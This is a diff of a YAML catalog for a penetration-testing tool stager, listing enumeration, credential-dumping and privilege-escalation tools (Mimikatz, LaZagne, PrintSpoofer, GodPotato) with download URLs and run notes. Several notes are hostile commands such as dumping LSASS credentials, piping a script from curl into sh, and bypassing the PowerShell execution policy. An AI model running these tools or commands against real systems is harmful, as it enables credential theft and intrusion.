@@ -1,1832 +1,2073 @@
-version: "1.0"
-release_base_url: "https://github.com/yourorg/seep/releases/download"
-tools_release: "tools-v1.0.0"
-
+version: '1.0'
+release_base_url: https://github.com/Real-Fruit-Snacks/Seep/releases/download
+tools_release: tools-v1.0.0
 tools:
-  # ---------------------------------------------------------------------------
-  # Enumeration
-  # ---------------------------------------------------------------------------
-
-  - name: "winPEASx64.exe"
-    display_name: "WinPEAS (x64)"
-    description: "Windows Privilege Escalation Awesome Script - x64 binary"
-    project_url: "https://github.com/peass-ng/PEASS-ng"
-    upstream_url: "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "WinPEAS"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["enumeration", "privesc", "peass"]
-    finding_triggers: ["*"]
-    notes: "Run with: .\\winPEASx64.exe"
-
-  - name: "winPEASx86.exe"
-    display_name: "WinPEAS (x86)"
-    description: "Windows Privilege Escalation Awesome Script - x86 binary"
-    project_url: "https://github.com/peass-ng/PEASS-ng"
-    upstream_url: "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "WinPEAS"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "x86"
-    tags: ["enumeration", "privesc", "peass"]
-    finding_triggers: ["*"]
-    notes: "Run with: .\\winPEASx86.exe"
-
-  - name: "winPEASany.exe"
-    display_name: "WinPEAS (Any CPU)"
-    description: "Windows Privilege Escalation Awesome Script - Any CPU, obfuscated"
-    project_url: "https://github.com/peass-ng/PEASS-ng"
-    upstream_url: "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "WinPEAS"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "peass", "obfuscated"]
-    finding_triggers: ["*"]
-    notes: "Obfuscated build; works on both x86 and x64"
-
-  - name: "winPEAS.bat"
-    display_name: "WinPEAS (Batch)"
-    description: "Windows Privilege Escalation Awesome Script - Batch version"
-    project_url: "https://github.com/peass-ng/PEASS-ng"
-    upstream_url: "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "WinPEAS"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "peass", "batch"]
-    finding_triggers: ["*"]
-    notes: "Batch fallback when .NET is unavailable"
-
-  - name: "linpeas.sh"
-    display_name: "LinPEAS (Shell)"
-    description: "Linux Privilege Escalation Awesome Script - Shell version"
-    project_url: "https://github.com/peass-ng/PEASS-ng"
-    upstream_url: "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "LinPEAS"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "peass", "linux"]
-    finding_triggers: ["*"]
-    notes: "Run with: sh linpeas.sh or curl | sh"
-
-  - name: "linpeas_linux_amd64"
-    display_name: "LinPEAS (Binary, amd64)"
-    description: "Linux Privilege Escalation Awesome Script - Static binary for amd64"
-    project_url: "https://github.com/peass-ng/PEASS-ng"
-    upstream_url: "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64"
-    upstream_version: "latest"
-    license: "Apache-2.0"
-    sha256: ""
-    folder: "LinPEAS"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["enumeration", "privesc", "peass", "linux", "static"]
-    finding_triggers: ["*"]
-    notes: "Static binary, no dependencies"
-
-  - name: "SharpUp.exe"
-    display_name: "SharpUp"
-    description: "C# port of PowerUp - checks for common Windows privesc vectors"
-    project_url: "https://github.com/GhostPack/SharpUp"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpUp.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpUp"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "ghostpack"]
-    finding_triggers: ["*"]
-    notes: "Run with: .\\SharpUp.exe audit"
-
-  - name: "Seatbelt.exe"
-    display_name: "Seatbelt"
-    description: "Security-oriented host-survey tool - performs numerous safety checks"
-    project_url: "https://github.com/GhostPack/Seatbelt"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "Seatbelt"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "survey", "ghostpack"]
-    finding_triggers: ["*"]
-    notes: "Run with: .\\Seatbelt.exe -group=all"
-
-  - name: "PowerUp.ps1"
-    display_name: "PowerUp"
-    description: "PowerSploit privesc module - finds common Windows misconfigurations"
-    project_url: "https://github.com/PowerShellMafia/PowerSploit"
-    upstream_url: "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "PowerSploit"
-    categories: ["Enumeration", "AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "powersploit", "powershell"]
-    finding_triggers: ["*"]
-    notes: "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"
-
-  - name: "PrivescCheck.ps1"
-    display_name: "PrivescCheck"
-    description: "PowerShell script to enumerate common Windows privilege escalation vectors"
-    project_url: "https://github.com/itm4n/PrivescCheck"
-    upstream_url: "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "PrivescCheck"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "powershell"]
-    finding_triggers: ["*"]
-    notes: "Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck"
-
-  - name: "jaws-enum.ps1"
-    display_name: "JAWS"
-    description: "Just Another Windows (Enum) Script - Windows enumeration"
-    project_url: "https://github.com/411Hall/JAWS"
-    upstream_url: "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "JAWS"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "powershell"]
-    finding_triggers: ["*"]
-    notes: "Run with: powershell -ep bypass -f jaws-enum.ps1"
-
-  - name: "Watson.exe"
-    display_name: "Watson"
-    description: "Enumerate missing KBs and suggest exploits for privilege escalation"
-    project_url: "https://github.com/rasta-mouse/Watson"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Watson.exe"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "Watson"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "patch", "exploit-suggester"]
-    finding_triggers: ["*"]
-    notes: "Run with: .\\Watson.exe"
-
-  - name: "Sherlock.ps1"
-    display_name: "Sherlock"
-    description: "Find missing Windows patches for privilege escalation (predecessor to Watson)"
-    project_url: "https://github.com/rasta-mouse/Sherlock"
-    upstream_url: "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "Sherlock"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "patch", "powershell"]
-    finding_triggers: ["*"]
-    notes: "Import-Module .\\Sherlock.ps1; Find-AllVulns (deprecated, prefer Watson)"
-
-  - name: "LinEnum.sh"
-    display_name: "LinEnum"
-    description: "Linux enumeration and privilege escalation checks"
-    project_url: "https://github.com/rebootuser/LinEnum"
-    upstream_url: "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
-    upstream_version: "latest"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "LinEnum"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "linux"]
-    finding_triggers: ["*"]
-    notes: "Run with: sh LinEnum.sh -t"
-
-  - name: "lse.sh"
-    display_name: "Linux Smart Enumeration"
-    description: "Linux enumeration tool with verbosity levels"
-    project_url: "https://github.com/diego-treitos/linux-smart-enumeration"
-    upstream_url: "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"
-    upstream_version: "latest"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "LSE"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "linux"]
-    finding_triggers: ["*"]
-    notes: "Run with: sh lse.sh -l 2"
-
-  - name: "linux-exploit-suggester.sh"
-    display_name: "Linux Exploit Suggester"
-    description: "Suggests applicable kernel exploits based on OS release and kernel version"
-    project_url: "https://github.com/The-Z-Labs/linux-exploit-suggester"
-    upstream_url: "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "LES"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "any"
-    tags: ["enumeration", "privesc", "linux", "kernel", "exploit-suggester"]
-    finding_triggers: ["*"]
-    notes: "Run with: sh linux-exploit-suggester.sh"
-
-  - name: "pspy64"
-    display_name: "pspy (64-bit)"
-    description: "Unprivileged Linux process snooping - monitors processes without root"
-    project_url: "https://github.com/DominicBreuker/pspy"
-    upstream_url: "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
-    upstream_version: "v1.2.1"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "pspy"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["enumeration", "process-monitor", "linux"]
-    finding_triggers: ["*"]
-    notes: "Run with: ./pspy64"
-
-  - name: "pspy32"
-    display_name: "pspy (32-bit)"
-    description: "Unprivileged Linux process snooping - 32-bit binary"
-    project_url: "https://github.com/DominicBreuker/pspy"
-    upstream_url: "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32"
-    upstream_version: "v1.2.1"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "pspy"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "x86"
-    tags: ["enumeration", "process-monitor", "linux"]
-    finding_triggers: ["*"]
-    notes: "Run with: ./pspy32"
-
-  - name: "pspy64s"
-    display_name: "pspy (64-bit, small)"
-    description: "Unprivileged Linux process snooping - small 64-bit binary"
-    project_url: "https://github.com/DominicBreuker/pspy"
-    upstream_url: "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s"
-    upstream_version: "v1.2.1"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "pspy"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "x64"
-    tags: ["enumeration", "process-monitor", "linux", "small"]
-    finding_triggers: ["*"]
-    notes: "Smaller binary, fewer features than pspy64"
-
-  - name: "pspy32s"
-    display_name: "pspy (32-bit, small)"
-    description: "Unprivileged Linux process snooping - small 32-bit binary"
-    project_url: "https://github.com/DominicBreuker/pspy"
-    upstream_url: "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s"
-    upstream_version: "v1.2.1"
-    license: "GPL-3.0"
-    sha256: ""
-    folder: "pspy"
-    categories: ["Enumeration"]
-    platform: "linux"
-    architecture: "x86"
-    tags: ["enumeration", "process-monitor", "linux", "small"]
-    finding_triggers: ["*"]
-    notes: "Smaller binary, fewer features than pspy32"
-
-  - name: "accesschk.exe"
-    display_name: "AccessChk (64-bit)"
-    description: "Sysinternals tool to check effective permissions on files, registry, services"
-    project_url: "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
-    upstream_url: "https://download.sysinternals.com/files/AccessChk.zip"
-    upstream_version: "latest"
-    license: "Proprietary"
-    sha256: ""
-    folder: "Sysinternals"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["enumeration", "permissions", "services", "sysinternals"]
-    finding_triggers: ["unquoted_service_path", "writable_path_dir"]
-    notes: "Extracted as accesschk64.exe from archive"
-
-  - name: "accesschk32.exe"
-    display_name: "AccessChk (32-bit)"
-    description: "Sysinternals tool to check effective permissions - 32-bit build"
-    project_url: "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
-    upstream_url: "https://download.sysinternals.com/files/AccessChk.zip"
-    upstream_version: "latest"
-    license: "Proprietary"
-    sha256: ""
-    folder: "Sysinternals"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "x86"
-    tags: ["enumeration", "permissions", "services", "sysinternals"]
-    finding_triggers: ["unquoted_service_path", "writable_path_dir"]
-    notes: "Extracted as accesschk.exe (32-bit) from archive"
-
-  - name: "PsExec.exe"
-    display_name: "PsExec (64-bit)"
-    description: "Sysinternals remote process execution utility"
-    project_url: "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec"
-    upstream_url: "https://download.sysinternals.com/files/PSTools.zip"
-    upstream_version: "latest"
-    license: "Proprietary"
-    sha256: ""
-    folder: "Sysinternals"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["execution", "remote", "sysinternals"]
-    finding_triggers: ["*"]
-    notes: "Extracted as PsExec64.exe from PSTools.zip"
-
-  - name: "procdump.exe"
-    display_name: "ProcDump (64-bit)"
-    description: "Sysinternals process dump utility for memory extraction"
-    project_url: "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
-    upstream_url: "https://download.sysinternals.com/files/Procdump.zip"
-    upstream_version: "latest"
-    license: "Proprietary"
-    sha256: ""
-    folder: "Sysinternals"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["dump", "process", "memory", "sysinternals"]
-    finding_triggers: ["*"]
-    notes: "Extracted as procdump64.exe from archive"
-
-  - name: "SharpWMI.exe"
-    display_name: "SharpWMI"
-    description: "C# implementation of WMI for remote system interaction"
-    project_url: "https://github.com/GhostPack/SharpWMI"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpWMI.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpWMI"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["enumeration", "wmi", "ghostpack"]
-    finding_triggers: ["*"]
-    notes: "Run with: .\\SharpWMI.exe action=query query=\"select * from win32_service\""
-
-  - name: "RunasCs.exe"
-    display_name: "RunasCs"
-    description: "C# runas implementation with proper credential handling and process creation"
-    project_url: "https://github.com/antonioCoco/RunasCs"
-    upstream_url: "https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip"
-    upstream_version: "v1.5"
-    license: "MIT"
-    sha256: ""
-    folder: "RunasCs"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["execution", "runas", "credentials"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey"]
-    notes: "Run with: .\\RunasCs.exe user pass cmd.exe"
-
-  - name: "RunasCs_net2.exe"
-    display_name: "RunasCs (.NET 2.0)"
-    description: "RunasCs compiled for .NET 2.0 - for older Windows systems"
-    project_url: "https://github.com/antonioCoco/RunasCs"
-    upstream_url: "https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip"
-    upstream_version: "v1.5"
-    license: "MIT"
-    sha256: ""
-    folder: "RunasCs"
-    categories: ["Enumeration"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["execution", "runas", "credentials", "net2"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey"]
-    notes: "For legacy .NET 2.0 systems"
-
-  # ---------------------------------------------------------------------------
-  # Credentials
-  # ---------------------------------------------------------------------------
-
-  - name: "lazagne.exe"
-    display_name: "LaZagne"
-    description: "Credentials recovery tool - extracts passwords stored on local computer"
-    project_url: "https://github.com/AlessandroZ/LaZagne"
-    upstream_url: "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
-    upstream_version: "v2.4.6"
-    license: "LGPL-3.0"
-    sha256: ""
-    folder: "LaZagne"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "password-recovery", "browsers"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\lazagne.exe all"
-
-  - name: "mimikatz.exe"
-    display_name: "Mimikatz (x64)"
-    description: "Windows credential extraction tool - x64 binary"
-    project_url: "https://github.com/gentilkiwi/mimikatz"
-    upstream_url: "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
-    upstream_version: "latest"
-    license: "CC-BY-4.0"
-    sha256: ""
-    folder: "Mimikatz"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["credentials", "mimikatz", "lsass", "kerberos"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Extracted from mimikatz_trunk.zip (x64/mimikatz.exe)"
-
-  - name: "mimikatz32.exe"
-    display_name: "Mimikatz (x86)"
-    description: "Windows credential extraction tool - 32-bit binary"
-    project_url: "https://github.com/gentilkiwi/mimikatz"
-    upstream_url: "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
-    upstream_version: "latest"
-    license: "CC-BY-4.0"
-    sha256: ""
-    folder: "Mimikatz"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "x86"
-    tags: ["credentials", "mimikatz", "lsass", "kerberos"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Extracted from mimikatz_trunk.zip (Win32/mimikatz.exe)"
-
-  - name: "Invoke-Mimikatz.ps1"
-    display_name: "Invoke-Mimikatz"
-    description: "PowerSploit module - reflective Mimikatz loader for in-memory execution"
-    project_url: "https://github.com/PowerShellMafia/PowerSploit"
-    upstream_url: "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "PowerSploit"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "mimikatz", "powersploit", "powershell", "in-memory"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "IEX then: Invoke-Mimikatz -DumpCreds"
-
-  - name: "SharpDPAPI.exe"
-    display_name: "SharpDPAPI"
-    description: "C# port of DPAPI functions - decrypt DPAPI-protected data"
-    project_url: "https://github.com/GhostPack/SharpDPAPI"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpDPAPI.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpDPAPI"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "dpapi", "ghostpack"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\SharpDPAPI.exe triage"
-
-  - name: "SharpChrome.exe"
-    display_name: "SharpChrome"
-    description: "C# tool to extract Chrome browser saved credentials and cookies"
-    project_url: "https://github.com/GhostPack/SharpDPAPI"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpChrome.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpChrome"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "chrome", "browser", "ghostpack"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\SharpChrome.exe logins"
-
-  - name: "SharpWeb.exe"
-    display_name: "SharpWeb"
-    description: "C# tool to extract saved browser credentials from Chrome, Firefox, Edge"
-    project_url: "https://github.com/djhohnstein/SharpWeb"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpWeb.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpWeb"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "browser", "chrome", "firefox", "edge"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\SharpWeb.exe all"
-
-  - name: "Rubeus.exe"
-    display_name: "Rubeus"
-    description: "C# Kerberos abuse toolkit - ticket requests, roasting, delegation attacks"
-    project_url: "https://github.com/GhostPack/Rubeus"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "Rubeus"
-    categories: ["Credentials", "AD"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "kerberos", "roasting", "ghostpack", "ad"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\Rubeus.exe triage"
-
-  - name: "SafetyKatz.exe"
-    display_name: "SafetyKatz"
-    description: "MiniDumpWriteDump of LSASS then Mimikatz parsing in-memory"
-    project_url: "https://github.com/GhostPack/SafetyKatz"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SafetyKatz.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SafetyKatz"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "lsass", "mimikatz", "ghostpack"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\SafetyKatz.exe"
-
-  - name: "SharpKatz.exe"
-    display_name: "SharpKatz"
-    description: "C# port of Mimikatz credential extraction functions"
-    project_url: "https://github.com/b4rtik/SharpKatz"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpKatz.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpKatz"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "mimikatz", "lsass"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\SharpKatz.exe --Command logonpasswords"
-
-  - name: "SharpSecDump.exe"
-    display_name: "SharpSecDump"
-    description: "C# port of Impacket secretsdump - remote SAM/LSA/NTDS extraction"
-    project_url: "https://github.com/G0ldenGunSec/SharpSecDump"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpSecDump.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpSecDump"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "secretsdump", "sam", "ntds"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\SharpSecDump.exe -target=localhost"
-
-  - name: "Snaffler.exe"
-    display_name: "Snaffler"
-    description: "Tool to find interesting data in Active Directory file shares"
-    project_url: "https://github.com/SnaffCon/Snaffler"
-    upstream_url: "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe"
-    upstream_version: "latest"
-    license: "MIT"
-    sha256: ""
-    folder: "Snaffler"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "shares", "fileshare", "ad"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\Snaffler.exe -s -o snaffler.log"
-
-  - name: "SharpRoast.exe"
-    display_name: "SharpRoast"
-    description: "C# Kerberoasting tool - request and extract service ticket hashes"
-    project_url: "https://github.com/GhostPack/SharpRoast"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpRoast.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "SharpRoast"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "kerberoasting", "ghostpack", "ad"]
-    finding_triggers: ["domain_joined"]
-    notes: "Run with: .\\SharpRoast.exe all"
-
-  - name: "LockLess.exe"
-    display_name: "LockLess"
-    description: "Access locked files by copying file handles from other processes"
-    project_url: "https://github.com/GhostPack/LockLess"
-    upstream_url: "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/LockLess.exe"
-    upstream_version: "latest"
-    license: "BSD-3-Clause"
-    sha256: ""
-    folder: "LockLess"
-    categories: ["Credentials"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["credentials", "file-access", "ghostpack"]
-    finding_triggers: ["autologon_credentials", "saved_credentials_cmdkey", "ps_history_credentials"]
-    notes: "Run with: .\\LockLess.exe /process:lsass.exe /file:C:\\path\\to\\file"
-
-  # ---------------------------------------------------------------------------
-  # TokenAbuse
-  # ---------------------------------------------------------------------------
-
-  - name: "PrintSpoofer64.exe"
-    display_name: "PrintSpoofer (64-bit)"
-    description: "Abuse SeImpersonatePrivilege via print spooler - x64"
-    project_url: "https://github.com/itm4n/PrintSpoofer"
-    upstream_url: "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
-    upstream_version: "v1.0"
-    license: "MIT"
-    sha256: ""
-    folder: "PrintSpoofer"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["token-abuse", "impersonation", "spooler", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\PrintSpoofer64.exe -i -c cmd"
-
-  - name: "PrintSpoofer32.exe"
-    display_name: "PrintSpoofer (32-bit)"
-    description: "Abuse SeImpersonatePrivilege via print spooler - x86"
-    project_url: "https://github.com/itm4n/PrintSpoofer"
-    upstream_url: "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe"
-    upstream_version: "v1.0"
-    license: "MIT"
-    sha256: ""
-    folder: "PrintSpoofer"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "x86"
-    tags: ["token-abuse", "impersonation", "spooler", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\PrintSpoofer32.exe -i -c cmd"
-
-  - name: "GodPotato-NET4.exe"
-    display_name: "GodPotato (.NET 4)"
-    description: "Potato privilege escalation via DCOM - .NET 4.x"
-    project_url: "https://github.com/BeichenDream/GodPotato"
-    upstream_url: "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
-    upstream_version: "v1.20"
-    license: "MIT"
-    sha256: ""
-    folder: "GodPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "Run with: .\\GodPotato-NET4.exe -cmd \"cmd /c whoami\""
-
-  - name: "GodPotato-NET35.exe"
-    display_name: "GodPotato (.NET 3.5)"
-    description: "Potato privilege escalation via DCOM - .NET 3.5"
-    project_url: "https://github.com/BeichenDream/GodPotato"
-    upstream_url: "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe"
-    upstream_version: "v1.20"
-    license: "MIT"
-    sha256: ""
-    folder: "GodPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "For older systems with .NET 3.5 only"
-
-  - name: "GodPotato-NET2.exe"
-    display_name: "GodPotato (.NET 2.0)"
-    description: "Potato privilege escalation via DCOM - .NET 2.0"
-    project_url: "https://github.com/BeichenDream/GodPotato"
-    upstream_url: "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe"
-    upstream_version: "v1.20"
-    license: "MIT"
-    sha256: ""
-    folder: "GodPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "any"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
-    notes: "For legacy systems with .NET 2.0 only"
-
-  - name: "JuicyPotato.exe"
-    display_name: "JuicyPotato"
-    description: "Abuse SeImpersonate/SeAssignPrimaryToken via COM servers"
-    project_url: "https://github.com/ohpe/juicy-potato"
-    upstream_url: "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
-    upstream_version: "v0.1"
-    license: "MIT"
-    sha256: ""
-    folder: "JuicyPotato"
-    categories: ["TokenAbuse"]
-    platform: "windows"
-    architecture: "x64"
-    tags: ["token-abuse", "potato", "impersonation", "privesc"]
-    finding_triggers: ["se_impersonate_enabled", "se_assign_primary_token_enabled"]
